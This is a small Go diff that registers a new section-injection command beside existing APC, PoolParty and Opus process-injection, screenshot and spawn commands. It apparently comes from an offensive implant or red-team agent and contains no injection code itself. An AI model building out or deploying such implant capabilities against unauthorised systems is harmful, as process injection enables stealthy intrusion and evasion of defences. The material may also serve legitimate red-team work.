@@ -18,6 +18,7 @@ func registerPlatformCommands() {
 	RegisterCommand(&TsCommand{})
 	RegisterCommand(&ApcInjectionCommand{})
 	RegisterCommand(&PoolPartyInjectionCommand{})
+	RegisterCommand(&SectionInjectionCommand{})
 	RegisterCommand(&ScreenshotCommand{})
 	RegisterCommand(&SpawnCommand{})
 	RegisterCommand(&OpusInjectionCommand{})
